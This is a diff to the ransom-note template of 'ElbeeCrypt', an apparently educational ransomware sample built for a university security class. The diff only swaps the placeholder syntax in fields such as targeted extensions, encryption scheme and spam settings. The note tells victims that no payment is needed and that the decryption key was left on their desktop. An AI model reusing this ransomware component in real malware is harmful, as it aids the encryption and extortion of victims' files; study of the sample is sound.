@@ -2,16 +2,16 @@
 
 If you are reading this, it means your personal files were locked by ElbeeCrypt, an experimental ransomware sample made as a project for CSULB's CECS-378 computer security class. All of your images, videos, music, documents, etc have been securely encrypted using public key cryptography. More information about this run, including the fingerprint of the public key used, can be found below:
 
-Encryption scheme: {encryption_scheme}
-Keypair type: {keypair_type}
-Public key fingerprint: {public_key_fingerprint}
-Targeted extensions: {target_extensions}
-Root directories: {root_directories}
-Encrypted extension: {encrypted_extension}
-Encrypted file list location: {encrypted_filelist_location}
-Total files encrypted: {total_encrypted}
-Spam ransom note: {spam_ransom_note}
-Startup safety net enabled: {safety_net_enabled} (was bypassed if this option is true)
+Encryption scheme: %encryption_scheme%
+Keypair type: %keypair_type%
+Public key fingerprint: %public_key_fingerprint%
+Targeted extensions: %target_extensions%
+Root directories: %root_directories%
+Encrypted extension: %encrypted_extension%
+Encrypted file list location: %encrypted_filelist_location%
+Total files encrypted: %total_encrypted%
+Spam ransom note: %spam_ransom_note%
+Startup safety net enabled: %safety_net_enabled% (was bypassed if this option is true)
 
 Although you are now a victim of ransomware, you are NOT required to pay any sort of monetary compensation to decrypt your files. ElbeeCrypt has not discarded the unique private key used in the encryption process, and it is available on your desktop. It should be named something similar to "elbeecrypt-privkey_<some random str>.elbeecrypt-key". Additionally, unlike many recently discovered ransomware samples, ElbeeCrypt HAS NOT submitted any of your personal files or otherwise any personally identifiable information (PII) to any sort of web service or 3rd party. This sample should've come with a decryptor tool that will utilize your uniquely generated private key. To use the decryptor, simply open it, and follow the instructions provided. You will need the decryption key as well as your encrypted files, so DO NOT RENAME OR DISCARD ANY ENCRYPTED FILE OR THE PRIVATE KEY. If you discard the private key, then your files are effectively UNRECOVERABLE!
 
